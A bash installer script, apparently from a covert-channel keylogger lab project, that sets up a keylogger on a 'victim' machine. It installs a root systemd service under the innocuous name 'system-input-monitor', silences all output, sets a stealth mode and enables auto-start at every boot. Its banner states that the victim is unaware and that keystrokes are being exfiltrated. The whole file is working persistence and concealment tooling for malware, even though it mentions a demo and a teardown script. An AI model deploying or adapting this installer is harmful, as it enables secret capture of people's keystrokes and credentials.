#!/bin/bash
# =============================================================
#  setup_victim.sh
#  Victim VM — Autonomous malware installation
#  Run once: sudo bash setup_victim.sh
# =============================================================

set -e

# ── Paths — adjust if your layout differs ──────────────────
PROJECT_DIR="/home/kali/Desktop/Covert-Channel-Keylogger"
VICTIM_DIR="$PROJECT_DIR/victim"
VENV_DIR="$PROJECT_DIR/venv"
VENV_PYTHON="$VENV_DIR/bin/python3"
VENV_PIP="$VENV_DIR/bin/pip"
SERVICE_NAME="system-input-monitor"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

ok()   { echo "    [OK] $*"; }
fail() { echo ""; echo "    [!!] $*"; exit 1; }
step() { echo ""; echo "[$1] $2"; }

echo ""
echo "============================================================"
echo "  Covert Keylogger — Victim Side Autonomous Setup"
echo "============================================================"

# ── Step 1: Verify required script files exist ──────────────
step "1/5" "Checking project files..."
[ -f "$VICTIM_DIR/keylogger_local.py" ] || fail "keylogger_local.py not found in $VICTIM_DIR"
[ -f "$VICTIM_DIR/dns_exfil.py"       ] || fail "dns_exfil.py not found in $VICTIM_DIR"
[ -f "$VICTIM_DIR/icmp_exfil.py"      ] || fail "icmp_exfil.py not found in $VICTIM_DIR"
ok "All script files present"

# ── Step 2: Create venv if missing, then install packages ───
step "2/5" "Setting up Python virtual environment..."

if [ ! -f "$VENV_PYTHON" ]; then
    echo "    [~] venv not found — creating with system-site-packages..."
    # --system-site-packages lets the venv see apt-installed packages
    # (scapy, evdev may already be installed via apt on this Kali VM)
    python3 -m venv --system-site-packages "$VENV_DIR"
    ok "venv created at $VENV_DIR"
else
    ok "venv already exists at $VENV_DIR"
fi

# Install required packages into the venv (not system pip)
echo "    [~] Installing packages into venv..."
"$VENV_PIP" install --quiet evdev scapy 2>/dev/null || {
    # pip install failed — try apt as fallback (Kali has these packages)
    echo "    [~] pip install failed — trying apt fallback..."
    apt-get install -y -q python3-evdev python3-scapy 2>/dev/null || true
    # Recreate venv with system-site-packages so apt packages are visible
    rm -rf "$VENV_DIR"
    python3 -m venv --system-site-packages "$VENV_DIR"
}

# Final verification
"$VENV_PYTHON" -c "import evdev, scapy" 2>/dev/null \
    || fail "evdev or scapy still not importable. Run manually:
             sudo apt install python3-evdev python3-scapy
             then re-run this script."
ok "evdev and scapy confirmed in venv"

# ── Step 3: Write the systemd service file ──────────────────
step "3/5" "Installing systemd service..."
cat > "$SERVICE_FILE" << EOF
[Unit]
Description=System Input Monitor Service
After=network.target graphical-session.target
Wants=network.target

[Service]
Type=simple
User=root
ExecStart=${VENV_PYTHON} ${VICTIM_DIR}/keylogger_local.py
Restart=on-failure
RestartSec=10s
StandardOutput=null
StandardError=null
WorkingDirectory=${VICTIM_DIR}
Environment=KEYLOGGER_MODE=stealth

[Install]
WantedBy=multi-user.target
EOF
chmod 644 "$SERVICE_FILE"
ok "Service file written → $SERVICE_FILE"

# ── Step 4: Enable and start ────────────────────────────────
step "4/5" "Enabling and starting service..."
systemctl daemon-reload
systemctl enable "$SERVICE_NAME" --quiet
systemctl start  "$SERVICE_NAME"
sleep 3

if systemctl is-active --quiet "$SERVICE_NAME"; then
    PID=$(systemctl show -p MainPID --value "$SERVICE_NAME")
    ok "Service ACTIVE  (PID: $PID)"
else
    echo ""
    echo "    [!!] Service failed. Full diagnostics:"
    systemctl status "$SERVICE_NAME" --no-pager
    echo ""
    echo "    Try running keylogger manually to see the actual error:"
    echo "    sudo $VENV_PYTHON $VICTIM_DIR/keylogger_local.py"
    exit 1
fi

# ── Step 5: Confirm persistence ─────────────────────────────
step "5/5" "Confirming stealth and persistence..."
systemctl is-enabled --quiet "$SERVICE_NAME" && ok "Auto-starts at every boot"
pgrep -f "keylogger_local.py" > /dev/null    && ok "Running silently (no terminal window)"

echo ""
echo "============================================================"
echo "  INSTALLATION COMPLETE"
echo ""
echo "  Service : $SERVICE_NAME"
echo "  Status  : $(systemctl is-active $SERVICE_NAME)"
echo "  PID     : $(systemctl show -p MainPID --value $SERVICE_NAME)"
echo "  Stealth : stdout=null | stderr=null | mode=stealth"
echo "  Persist : starts automatically at every boot"
echo ""
echo "  Victim is unaware. Keystrokes are being exfiltrated."
echo ""
echo "  Verify after reboot:  systemctl status $SERVICE_NAME"
echo "  Remove after demo:    sudo bash teardown_victim.sh"
echo "============================================================"
